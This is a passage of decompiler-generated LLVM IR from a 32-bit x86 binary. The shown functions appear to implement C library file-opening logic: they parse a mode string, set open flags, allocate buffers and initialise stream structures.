  br i1 %v5_804bfb9, label %dec_label_pc_804c1af, label %dec_label_pc_804bfc3

dec_label_pc_804bfc3:                             ; preds = %dec_label_pc_804bfb9
  store i32 %v0_804bfb9, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804bfc9 = call i32 @function_804eac9(i32 %v0_804bfb9)
  br label %dec_label_pc_804c1aa

dec_label_pc_804bfd3:                             ; preds = %dec_label_pc_804bf78
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804bfd5

dec_label_pc_804bfd5:                             ; preds = %dec_label_pc_804bf9e, %dec_label_pc_804bf95, %dec_label_pc_804bfd3
  %v0_804bfe6 = phi i32 [ 1089, %dec_label_pc_804bf9e ], [ 577, %dec_label_pc_804bf95 ], [ 0, %dec_label_pc_804bfd3 ]
  %v1_804bfd5 = add i32 %v4_804bf7f, 1
  %v2_804bfd5 = inttoptr i32 %v1_804bfd5 to i8*
  %v3_804bfd5 = load i8, i8* %v2_804bfd5, align 1
  %v12_804bfd5 = icmp eq i8 %v3_804bfd5, 98
  %v1_804bfd5.v4_804bf7f = select i1 %v12_804bfd5, i32 %v1_804bfd5, i32 %v4_804bf7f
  store i32 %v1_804bfd5.v4_804bf7f, i32* %eax.global-to-local, align 4
  %v1_804bfe0 = add i32 %v1_804bfd5.v4_804bf7f, 1
  %v2_804bfe0 = inttoptr i32 %v1_804bfe0 to i8*
  %v3_804bfe0 = load i8, i8* %v2_804bfe0, align 1
  %v12_804bfe0 = icmp eq i8 %v3_804bfe0, 43
  %v1_804bfe4 = icmp eq i1 %v12_804bfe0, false
  br i1 %v1_804bfe4, label %dec_label_pc_804bfee, label %dec_label_pc_804bfe6

dec_label_pc_804bfe6:                             ; preds = %dec_label_pc_804bfd5
  %v1_804bfe8 = or i32 %v0_804bfe6, 1
  store i32 %v1_804bfe8, i32* %eax.global-to-local, align 4
  %v1_804bfeb = add nuw nsw i32 %v1_804bfe8, 1
  store i32 %v1_804bfeb, i32* @ebx, align 4
  br label %dec_label_pc_804bfee

dec_label_pc_804bfee:                             ; preds = %dec_label_pc_804bfd5, %dec_label_pc_804bfe6
  %v0_804c0717 = phi i32 [ %v0_804bfe6, %dec_label_pc_804bfd5 ], [ %v1_804bfeb, %dec_label_pc_804bfe6 ]
  %v1_804bfee = icmp eq i32 %arg3, 0
  %v1_804bff0 = icmp eq i1 %v1_804bfee, false
  br i1 %v1_804bff0, label %dec_label_pc_804c024, label %dec_label_pc_804bff2

dec_label_pc_804bff2:                             ; preds = %dec_label_pc_804bfee
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804bff7 = call i32 @function_804ddba(i32 80)
  store i32 %v1_804bff7, i32* %eax.global-to-local, align 4
  %v2_804bfff = icmp eq i32 %v1_804bff7, 0
  store i32 %v1_804bff7, i32* @ebp, align 4
  br i1 %v2_804bfff, label %dec_label_pc_804c1b1, label %dec_label_pc_804c009

dec_label_pc_804c009:                             ; preds = %dec_label_pc_804bff2
  %v2_804bff7 = inttoptr i32 %v1_804bff7 to i16*
  store i16 8192, i16* %v2_804bff7, align 2
  %v2_804c011 = add i32 %v1_804bff7, 8
  %v3_804c011 = inttoptr i32 %v2_804c011 to i32*
  store i32 0, i32* %v3_804c011, align 4
  %v2_804c018 = add i32 %v1_804bff7, 56
  store i32 %v2_804c018, i32* %eax.global-to-local, align 4
  store i32 %v2_804c018, i32* %stack_var_-76, align 4
  %v1_804c01c = call i32 @function_804c21f(i32 %v2_804c018)
  store i32 %v1_804c01c, i32* %eax.global-to-local, align 4
  %v0_804c071.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c024

dec_label_pc_804c024:                             ; preds = %dec_label_pc_804bfee, %dec_label_pc_804c009
  %v2_804c077 = phi i32 [ %v0_804c0717, %dec_label_pc_804bfee ], [ %v0_804c071.pre, %dec_label_pc_804c009 ]
  %v2_804c024 = icmp slt i32 %arg4, 0
  br i1 %v2_804c024, label %dec_label_pc_804c071, label %dec_label_pc_804c028

dec_label_pc_804c028:                             ; preds = %dec_label_pc_804c024
  %v1_804c02a = and i32 %v2_804c077, 32771
  %v1_804c030 = add nuw nsw i32 %v1_804c02a, 1
  store i32 %v1_804c030, i32* @edx, align 4
  %v0_804c031 = load i32, i32* @esi, align 4
  %v1_804c031 = add i32 %v0_804c031, 1
  %v2_804c034 = and i32 %v1_804c031, %v1_804c030
  store i32 %v2_804c034, i32* %eax.global-to-local, align 4
  %v12_804c036 = icmp eq i32 %v2_804c034, %v1_804c030
  %v1_804c038 = load i32, i32* @ebp, align 4
  %v2_804c038 = add i32 %v1_804c038, 4
  %v3_804c038 = inttoptr i32 %v2_804c038 to i32*
  store i32 %arg4, i32* %v3_804c038, align 4
  %v1_804c03b = icmp eq i1 %v12_804c036, false
  br i1 %v1_804c03b, label %dec_label_pc_804bfa6, label %dec_label_pc_804c041

dec_label_pc_804c041:                             ; preds = %dec_label_pc_804c028
  %v0_804c041 = load i32, i32* @esi, align 4
  %v1_804c043 = and i32 %v0_804c041, 1024
  %v1_804c045 = xor i32 %v1_804c043, 1024
  store i32 %v1_804c045, i32* %eax.global-to-local, align 4
  %v1_804c04a = load i32, i32* @ebx, align 4
  %v2_804c04a = and i32 %v1_804c04a, %v1_804c045
  %v3_804c04a = icmp eq i32 %v2_804c04a, 0
  br i1 %v3_804c04a, label %dec_label_pc_804c041.dec_label_pc_804c067_crit_edge, label %dec_label_pc_804c04e

dec_label_pc_804c041.dec_label_pc_804c067_crit_edge: ; preds = %dec_label_pc_804c041
  br label %dec_label_pc_804c067

dec_label_pc_804c04e:                             ; preds = %dec_label_pc_804c041
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v4_804c057 = call i32 @function_804f9e4(i32 %arg4, i32 4, i32 1024, i32 %v1_804c045)
  store i32 %v4_804c057, i32* %eax.global-to-local, align 4
  %v1_804c05f = icmp eq i32 %v4_804c057, 0
  %v1_804c061 = icmp eq i1 %v1_804c05f, false
  br i1 %v1_804c061, label %dec_label_pc_804bfa6, label %dec_label_pc_804c04e.dec_label_pc_804c067_crit_edge

dec_label_pc_804c04e.dec_label_pc_804c067_crit_edge: ; preds = %dec_label_pc_804c04e
  %v0_804c067.pre = load i32, i32* @esi, align 4
  %v0_804c06d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c067

dec_label_pc_804c067:                             ; preds = %dec_label_pc_804c041.dec_label_pc_804c067_crit_edge, %dec_label_pc_804c04e.dec_label_pc_804c067_crit_edge
  %v0_804c06d = phi i32 [ %v1_804c04a, %dec_label_pc_804c041.dec_label_pc_804c067_crit_edge ], [ %v0_804c06d.pre, %dec_label_pc_804c04e.dec_label_pc_804c067_crit_edge ]
  %v0_804c067 = phi i32 [ %v0_804c041, %dec_label_pc_804c041.dec_label_pc_804c067_crit_edge ], [ %v0_804c067.pre, %dec_label_pc_804c04e.dec_label_pc_804c067_crit_edge ]
  %v1_804c067 = and i32 %v0_804c067, 32768
  %v2_804c06d = or i32 %v1_804c067, %v0_804c06d
  store i32 %v2_804c06d, i32* @ebx, align 4
  br label %dec_label_pc_804c095

dec_label_pc_804c071:                             ; preds = %dec_label_pc_804c024
  %v11_804c073 = or i32 %v2_804c077, 32768
  store i32 %v11_804c073, i32* %eax.global-to-local, align 4
  %v1_804c076 = add i32 %arg4, 1
  %v8_804c076 = icmp eq i32 %v1_804c076, 0
  store i32 %v1_804c076, i32* @edi, align 4
  %v1_804c077 = icmp eq i1 %v8_804c076, false
  %v4_804c077 = select i1 %v1_804c077, i32 %v11_804c073, i32 %v2_804c077
  store i32 %v4_804c077, i32* @ebx, align 4
  %v0_804c081 = load i32, i32* @esi, align 4
  store i32 %v0_804c081, i32* %stack_var_-76, align 4
  %v3_804c082 = inttoptr i32 %v0_804c081 to i8*
  %v4_804c082 = call i32 @function_804fd24(i8* %v3_804c082, i32 %v4_804c077, i32 438)
  store i32 %v4_804c082, i32* %eax.global-to-local, align 4
  %v2_804c08a = icmp slt i32 %v4_804c082, 0
  %v1_804c08c = load i32, i32* @ebp, align 4
  %v2_804c08c = add i32 %v1_804c08c, 4
  %v3_804c08c = inttoptr i32 %v2_804c08c to i32*
  store i32 %v4_804c082, i32* %v3_804c08c, align 4
  br i1 %v2_804c08a, label %dec_label_pc_804bfb9, label %dec_label_pc_804c095

dec_label_pc_804c095:                             ; preds = %dec_label_pc_804c071, %dec_label_pc_804c067
  %v0_804c095 = load i32, i32* @ebp, align 4
  %v1_804c095 = inttoptr i32 %v0_804c095 to i32*
  %v2_804c095 = load i32, i32* %v1_804c095, align 4
  %v2_804c095.tr = trunc i32 %v2_804c095 to i16
  %v1_804c09d = and i16 %v2_804c095.tr, 8192
  %v3_804c09d = inttoptr i32 %v0_804c095 to i16*
  store i16 %v1_804c09d, i16* %v3_804c09d, align 2
  %v0_804c0a1 = load i32, i32* @ebx, align 4
  store i32 %v0_804c0a1, i32* %eax.global-to-local, align 4
  %v1_804c0a3 = and i32 %v0_804c0a1, -31744
  %v0_804c0a9 = load i32, i32* @ebp, align 4
  %v1_804c0a9 = inttoptr i32 %v0_804c0a9 to i32*
  %v2_804c0a9 = load i32, i32* %v1_804c0a9, align 4
  %v1_804c0ac = mul i32 %v0_804c0a1, 16
  %v1_804c0af = and i32 %v1_804c0ac, 48
  %v1_804c0b0 = add nuw nsw i32 %v1_804c0af, 16
  %v2_804c0b3 = xor i32 %v1_804c0b0, 48
  %v2_804c0b6 = or i32 %v2_804c0a9, %v1_804c0a3
  %v2_804c0b8 = or i32 %v2_804c0b6, %v2_804c0b3
  store i32 %v2_804c0b8, i32* %eax.global-to-local, align 4
  %v1_804c0ba = trunc i32 %v2_804c0b8 to i16
  %v3_804c0ba = inttoptr i32 %v0_804c0a9 to i16*
  store i16 %v1_804c0ba, i16* %v3_804c0ba, align 2
  %v0_804c0be = load i32, i32* %stack_var_-76, align 4
  %v1_804c0be = call i32 @function_804baa4(i32 %v0_804c0be)
  store i32 %v1_804c0be, i32* %eax.global-to-local, align 4
  %v0_804c0c6 = load i32, i32* @ebp, align 4
  %v1_804c0c6 = inttoptr i32 %v0_804c0c6 to i16*
  %v2_804c0c6 = load i16, i16* %v1_804c0c6, align 2
  %v3_804c0c6 = zext i16 %v2_804c0c6 to i32
  store i32 %v3_804c0c6, i32* @ebx, align 4
  %v1_804c0ca = inttoptr i32 %v1_804c0be to i32*
  %v2_804c0ca = load i32, i32* %v1_804c0ca, align 4
  store i32 %v2_804c0ca, i32* @edi, align 4
  store i32 %v1_804c0be, i32* @esi, align 4
  %v1_804c0ce = add i32 %v0_804c0c6, 4
  %v2_804c0ce = inttoptr i32 %v1_804c0ce to i32*
  %v3_804c0ce = load i32, i32* %v2_804c0ce, align 4
  store i32 %v3_804c0ce, i32* %stack_var_-76, align 4
  %v1_804c0d1 = call i32 @function_804d6e8(i32 %v3_804c0ce)
  %v2_804c0d9 = mul i32 %v1_804c0d1, 256
  store i32 %v2_804c0d9, i32* %eax.global-to-local, align 4
  %v0_804c0dc = load i32, i32* @ebx, align 4
  %v2_804c0dc = or i32 %v0_804c0dc, %v2_804c0d9
  store i32 %v2_804c0dc, i32* @ebx, align 4
  %v1_804c0de = trunc i32 %v2_804c0dc to i16
  %v2_804c0de = load i32, i32* @ebp, align 4
  %v3_804c0de = inttoptr i32 %v2_804c0de to i16*
  store i16 %v1_804c0de, i16* %v3_804c0de, align 2
  %v0_804c0e2 = load i32, i32* @edi, align 4
  %v1_804c0e2 = load i32, i32* @esi, align 4
  %v2_804c0e2 = inttoptr i32 %v1_804c0e2 to i32*
  store i32 %v0_804c0e2, i32* %v2_804c0e2, align 4
  %v0_804c0e4 = load i32, i32* @ebp, align 4
  %v1_804c0e4 = add i32 %v0_804c0e4, 8
  %v2_804c0e4 = inttoptr i32 %v1_804c0e4 to i32*
  %v3_804c0e4 = load i32, i32* %v2_804c0e4, align 4
  %v4_804c0e4 = icmp eq i32 %v3_804c0e4, 0
  %v1_804c0e8 = icmp eq i1 %v4_804c0e4, false
  br i1 %v1_804c0e8, label %dec_label_pc_804c11c, label %dec_label_pc_804c0ea

dec_label_pc_804c0ea:                             ; preds = %dec_label_pc_804c095
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804c0f2 = call i32 @function_804ddba(i32 4096)
  store i32 %v1_804c0f2, i32* %eax.global-to-local, align 4
  %v1_804c0fa = icmp eq i32 %v1_804c0f2, 0
  %v1_804c0fc = load i32, i32* @ebp, align 4
  %v2_804c0fc = add i32 %v1_804c0fc, 8
  %v3_804c0fc = inttoptr i32 %v2_804c0fc to i32*
  store i32 %v1_804c0f2, i32* %v3_804c0fc, align 4
  br i1 %v1_804c0fa, label %dec_label_pc_804c115, label %dec_label_pc_804c101

dec_label_pc_804c101:                             ; preds = %dec_label_pc_804c0ea
  %v1_804c101 = add i32 %v1_804c0f2, 4096
  store i32 %v1_804c101, i32* %eax.global-to-local, align 4
  %v1_804c106 = load i32, i32* @ebp, align 4
  %v2_804c106 = add i32 %v1_804c106, 12
  %v3_804c106 = inttoptr i32 %v2_804c106 to i32*
  store i32 %v1_804c101, i32* %v3_804c106, align 4
  %v0_804c109 = load i32, i32* @ebp, align 4
  %v1_804c109 = inttoptr i32 %v0_804c109 to i32*
  %v2_804c109 = load i32, i32* %v1_804c109, align 4
  %v1_804c10c = udiv i32 %v2_804c109, 256
  %v3_804c10c = and i32 %v1_804c10c, 191
  %v8_804c10c = or i32 %v3_804c10c, 64
  %v10_804c10c = mul nuw nsw i32 %v8_804c10c, 256
  %v11_804c10c = and i32 %v2_804c109, -65281
  %v12_804c10c = or i32 %v10_804c10c, %v11_804c10c
  store i32 %v12_804c10c, i32* %eax.global-to-local, align 4
  %v1_804c10f = trunc i32 %v12_804c10c to i16
  %v3_804c10f = inttoptr i32 %v0_804c109 to i16*
  store i16 %v1_804c10f, i16* %v3_804c10f, align 2
  br label %dec_label_pc_804c11c

dec_label_pc_804c115:                             ; preds = %dec_label_pc_804c0ea
  %v0_804c115 = load i32, i32* @ebp, align 4
  %v1_804c115 = add i32 %v0_804c115, 12
  %v2_804c115 = inttoptr i32 %v1_804c115 to i32*
  store i32 0, i32* %v2_804c115, align 4
  br label %dec_label_pc_804c11c

dec_label_pc_804c11c:                             ; preds = %dec_label_pc_804c095, %dec_label_pc_804c101, %dec_label_pc_804c115
  %v0_804c11c = load i32, i32* @ebp, align 4
  %v1_804c11c = add i32 %v0_804c11c, 8
  %v2_804c11c = inttoptr i32 %v1_804c11c to i32*
  %v3_804c11c = load i32, i32* %v2_804c11c, align 4
  store i32 %v3_804c11c, i32* %eax.global-to-local, align 4
  %v1_804c11f = add i32 %v0_804c11c, 2
  %v2_804c11f = inttoptr i32 %v1_804c11f to i8*
  store i8 0, i8* %v2_804c11f, align 1
  %v0_804c123 = load i32, i32* @ebp, align 4
  %v1_804c123 = add i32 %v0_804c123, 44
  %v2_804c123 = inttoptr i32 %v1_804c123 to i32*
  store i32 0, i32* %v2_804c123, align 4
  %v0_804c12a = load i32, i32* @ebp, align 4
  %v1_804c12a = add i32 %v0_804c12a, 1
  %v2_804c12a = inttoptr i32 %v1_804c12a to i8*
  %v3_804c12a = load i8, i8* %v2_804c12a, align 1
  %v4_804c12a = and i8 %v3_804c12a, 32
  %v5_804c12a = icmp eq i8 %v4_804c12a, 0
  %v0_804c12e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c12e = add i32 %v0_804c12a, 24
  %v3_804c12e = inttoptr i32 %v2_804c12e to i32*
  store i32 %v0_804c12e, i32* %v3_804c12e, align 4
  %v0_804c131 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c131 = load i32, i32* @ebp, align 4
  %v2_804c131 = add i32 %v1_804c131, 28
  %v3_804c131 = inttoptr i32 %v2_804c131 to i32*
  store i32 %v0_804c131, i32* %v3_804c131, align 4
  %v0_804c134 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c134 = load i32, i32* @ebp, align 4
  %v2_804c134 = add i32 %v1_804c134, 16
  %v3_804c134 = inttoptr i32 %v2_804c134 to i32*
  store i32 %v0_804c134, i32* %v3_804c134, align 4
  %v0_804c137 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c137 = load i32, i32* @ebp, align 4
  %v2_804c137 = add i32 %v1_804c137, 20
  %v3_804c137 = inttoptr i32 %v2_804c137 to i32*
  store i32 %v0_804c137, i32* %v3_804c137, align 4
  %v0_804c13a = load i32, i32* @global_var_8056230.116, align 16
  store i32 %v0_804c13a, i32* @eax, align 4
  %v1_804c13f = load i32, i32* @ebp, align 4
  %v2_804c13f = add i32 %v1_804c13f, 52
  %v3_804c13f = inttoptr i32 %v2_804c13f to i32*
  store i32 %v0_804c13a, i32* %v3_804c13f, align 4
  br i1 %v5_804c12a, label %dec_label_pc_804c1b1, label %dec_label_pc_804c144

dec_label_pc_804c144:                             ; preds = %dec_label_pc_804c11c
  %v2_804c14f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c14f, i32* %stack_var_-76, align 4
  %v2_804c154 = call i32 @function_804f65e(i32 %v2_804c14f, i32 134542939)
  store i32 %v2_804c154, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056218.108 to i32), i32* %stack_var_-76, align 4
  %v1_804c160 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056218.108 to i32))
  store i32 %v1_804c160, i32* @eax, align 4
  %v2_804c172 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804c172, i32* %stack_var_-76, align 4
  %v2_804c177 = call i32 @function_804f65e(i32 %v2_804c172, i32 134542939)
  store i32 %v2_804c177, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056200.117 to i32), i32* %stack_var_-76, align 4
  %v1_804c183 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056200.117 to i32))
  %v0_804c188 = load i32, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  store i32 %v0_804c188, i32* @eax, align 4
  %v1_804c18d = load i32, i32* @ebp, align 4
  %v2_804c18d = add i32 %v1_804c18d, 32
  %v3_804c18d = inttoptr i32 %v2_804c18d to i32*
  store i32 %v0_804c188, i32* %v3_804c18d, align 4
  %v2_804c190 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804c190, i32* @ecx, align 4
  %v0_804c191 = load i32, i32* @ebp, align 4
  store i32 %v0_804c191, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  store i32 %v2_804c172, i32* %stack_var_-76, align 4
  %v2_804c19b = call i32 @function_804f65e(i32 %v2_804c172, i32 1)
  store i32 %v2_804c172, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804c14f, i32* %stack_var_-76, align 4
  %v2_804c1a5 = call i32 @function_804f65e(i32 %v2_804c14f, i32 1)
  br label %dec_label_pc_804c1aa

dec_label_pc_804c1aa:                             ; preds = %dec_label_pc_804bfc3, %dec_label_pc_804c144
  %storemerge = phi i32 [ %v2_804c1a5, %dec_label_pc_804c144 ], [ %v1_804bfc9, %dec_label_pc_804bfc3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c1b1

dec_label_pc_804c1af:                             ; preds = %dec_label_pc_804bfb9, %dec_label_pc_804bfa6
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804c1b1

dec_label_pc_804c1b1:                             ; preds = %dec_label_pc_804c11c, %dec_label_pc_804bff2, %dec_label_pc_804c1aa, %dec_label_pc_804c1af
  %v0_804c1b4 = load i32, i32* @ebp, align 4
  store i32 %v0_804c1b4, i32* %eax.global-to-local, align 4
  %v2_804c1b6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c1b6, i32* @ebx, align 4
  store i32 %v0_804bf7a, i32* @esi, align 4
  store i32 %v0_804bf79, i32* @edi, align 4
  store i32 %v0_804bf78, i32* @ebp, align 4
  ret i32 %v0_804c1b4

; uselistorder directives
  uselistorder i32 %v2_804c172, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804c14f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804c109, { 1, 0 }
  uselistorder i32 %v1_804c0f2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804c0d9, { 1, 0 }
  uselistorder i32 %v1_804c0be, { 1, 0, 2 }
  uselistorder i32 %v11_804c073, { 1, 0 }
  uselistorder i32 %v1_804c045, { 2, 1, 0 }
  uselistorder i32 %v0_804c041, { 1, 0 }
  uselistorder i32 %v2_804c077, { 1, 0, 2 }
  uselistorder i32 %v1_804bff7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_804c1b1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804c1aa, { 1, 0 }
  uselistorder label %dec_label_pc_804c11c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c067, { 1, 0 }
  uselistorder label %dec_label_pc_804c024, { 1, 0 }
  uselistorder label %dec_label_pc_804bfee, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd5, { 2, 0, 1 }
}

define i32 @function_804c1bc() local_unnamed_addr {
dec_label_pc_804c1bc:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c1bd = load i32, i32* @edi, align 4
  %v0_804c1be = load i32, i32* @esi, align 4
  %v0_804c1bf = load i32, i32* @ebx, align 4
  store i32 %v0_804c1bf, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804c1c8 = call i32 @function_804baa4(i32 %v0_804c1bf)
  %v0_804c1d0 = load i16, i16* @global_var_8056240.104, align 64
  %v1_804c1d0 = zext i16 %v0_804c1d0 to i32
  store i32 %v1_804c1d0, i32* @esi, align 4
  %v1_804c1d7 = inttoptr i32 %v1_804c1c8 to i32*
  %v2_804c1d7 = load i32, i32* %v1_804c1d7, align 4
  store i32 %v2_804c1d7, i32* %ebp.global-to-local, align 4
  store i32 %v1_804c1c8, i32* @edi, align 4
  %v1_804c1dd = call i32 @function_804d6e8(i32 0)
  %v0_804c1e2 = load i32, i32* @ebx, align 4
  %v2_804c1eb = sub i32 %v0_804c1e2, %v1_804c1dd
  %v2_804c1ef = mul i32 %v2_804c1eb, 256
  %v0_804c1f2 = load i32, i32* @esi, align 4
  %v2_804c1f2 = xor i32 %v0_804c1f2, %v2_804c1ef
  %v1_804c1f4 = trunc i32 %v2_804c1f2 to i16
  store i16 %v1_804c1f4, i16* @global_var_8056240.104, align 64
  %v0_804c1fb = load i16, i16* @global_var_8056290.105, align 16
  %v1_804c1fb = zext i16 %v0_804c1fb to i32
  store i32 %v1_804c1fb, i32* @esi, align 4
  %v1_804c202 = call i32 @function_804d6e8(i32 1)
  %v0_804c207 = load i32, i32* @ebx, align 4
  %v2_804c207 = sub i32 %v0_804c207, %v1_804c202
  %v2_804c209 = mul i32 %v2_804c207, 256
  %v0_804c20c = load i32, i32* @esi, align 4
  %v2_804c20c = xor i32 %v2_804c209, %v0_804c20c
  %v1_804c20e = trunc i32 %v2_804c20c to i16
  store i16 %v1_804c20e, i16* @global_var_8056290.105, align 16
  %v0_804c215 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804c215 = load i32, i32* @edi, align 4
  %v2_804c215 = inttoptr i32 %v1_804c215 to i32*
  store i32 %v0_804c215, i32* %v2_804c215, align 4
  %v2_804c21a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c21a, i32* @ebx, align 4
  store i32 %v0_804c1be, i32* @esi, align 4
  store i32 %v0_804c1bd, i32* @edi, align 4
  ret i32 %v1_804c202

; uselistorder directives
  uselistorder i32 %v1_804c1c8, { 1, 0 }
  uselistorder i16* @global_var_8056290.105, { 1, 0 }
  uselistorder i32 (i32)* @function_804d6e8, { 1, 0, 2 }
}

define i32 @function_804c21f(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c21f:
  %v3_804c22d = inttoptr i32 %arg1 to i16*
  %v4_804c22d = call i32 @function_804d4b8(i16* %v3_804c22d, i32 ptrtoint (i32* @global_var_8053a6c.119 to i32), i32 24)
  ret i32 %v4_804c22d
}

define i32 @function_804c236() local_unnamed_addr {
dec_label_pc_804c236:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c236 = load i32, i32* @esi, align 4
  %v0_804c237 = load i32, i32* @ebx, align 4
  store i32 %v0_804c237, i32* %stack_var_-8, align 4
  %v1_804c240 = call i32 @function_804c21f(i32 ptrtoint (i32* @global_var_8056200.117 to i32))
  store i32 %v1_804c240, i32* %eax.global-to-local, align 4
  %v1_804c24c = call i32 @function_804c21f(i32 ptrtoint (i32* @global_var_8056218.108 to i32))
  store i32 %v1_804c24c, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804c29622 = icmp eq i32 %storemerge21, 0
  %v1_804c29824 = icmp eq i1 %v1_804c29622, false
  br i1 %v1_804c29824, label %dec_label_pc_804c259.lr.ph, label %dec_label_pc_804c2b6.preheader

dec_label_pc_804c259.lr.ph:                       ; preds = %dec_label_pc_804c236
  br label %dec_label_pc_804c259

dec_label_pc_804c259:                             ; preds = %dec_label_pc_804c259.lr.ph, %dec_label_pc_804c280
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804c259.lr.ph ], [ %storemerge, %dec_label_pc_804c280 ]
  %v1_804c25c = add i32 %storemerge25, 56
  store i32 %v1_804c25c, i32* @esi, align 4
  %v1_804c260 = call i32 @function_804f65b(i32 %v1_804c25c)
  store i32 %v1_804c260, i32* %eax.global-to-local, align 4
  %v1_804c268 = icmp eq i32 %v1_804c260, 0
  br i1 %v1_804c268, label %dec_label_pc_804c280, label %dec_label_pc_804c26c

dec_label_pc_804c26c:                             ; preds = %dec_label_pc_804c259
  %v0_804c26c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c26c = add i32 %v0_804c26c, 8
  %v2_804c26c = inttoptr i32 %v1_804c26c to i32*
  %v3_804c26c = load i32, i32* %v2_804c26c, align 4
  store i32 %v3_804c26c, i32* %eax.global-to-local, align 4
  %v1_804c26f = inttoptr i32 %v0_804c26c to i16*
  store i16 48, i16* %v1_804c26f, align 2
  %v0_804c274 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c274 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c274 = add i32 %v1_804c274, 24
  %v3_804c274 = inttoptr i32 %v2_804c274 to i32*
  store i32 %v0_804c274, i32* %v3_804c274, align 4
  %v0_804c277 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c277 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c277 = add i32 %v1_804c277, 28
  %v3_804c277 = inttoptr i32 %v2_804c277 to i32*
  store i32 %v0_804c277, i32* %v3_804c277, align 4
  %v0_804c27a = load i32, i32* %eax.global-to-local, align 4
  %v1_804c27a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c27a = add i32 %v1_804c27a, 16
  %v3_804c27a = inttoptr i32 %v2_804c27a to i32*
  store i32 %v0_804c27a, i32* %v3_804c27a, align 4
  %v0_804c27d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c27d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c27d = add i32 %v1_804c27d, 20
  %v3_804c27d = inttoptr i32 %v2_804c27d to i32*
  store i32 %v0_804c27d, i32* %v3_804c27d, align 4
  br label %dec_label_pc_804c280

dec_label_pc_804c280:                             ; preds = %dec_label_pc_804c259, %dec_label_pc_804c26c
  %v0_804c283 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c283 = add i32 %v0_804c283, 52
  %v2_804c283 = inttoptr i32 %v1_804c283 to i32*
  store i32 1, i32* %v2_804c283, align 4
  %v0_804c28a = load i32, i32* @esi, align 4
  %v1_804c28b = call i32 @function_804c21f(i32 %v0_804c28a)
  store i32 %v1_804c28b, i32* %eax.global-to-local, align 4
  %v0_804c290 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c290 = add i32 %v0_804c290, 32
  %v2_804c290 = inttoptr i32 %v1_804c290 to i32*
  %storemerge = load i32, i32* %v2_804c290, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804c296 = icmp eq i32 %storemerge, 0
  %v1_804c298 = icmp eq i1 %v1_804c296, false
  br i1 %v1_804c298, label %dec_label_pc_804c259, label %dec_label_pc_804c293.dec_label_pc_804c2b6.preheader_crit_edge

dec_label_pc_804c293.dec_label_pc_804c2b6.preheader_crit_edge: ; preds = %dec_label_pc_804c280
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80561fc.118 to i32*), align 4
  br label %dec_label_pc_804c2b6.preheader

dec_label_pc_804c2b6.preheader:                   ; preds = %dec_label_pc_804c293.dec_label_pc_804c2b6.preheader_crit_edge, %dec_label_pc_804c236
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804c293.dec_label_pc_804c2b6.preheader_crit_edge ], [ %storemerge21, %dec_label_pc_804c236 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804c2b63 = icmp eq i32 %storemerge12, 0
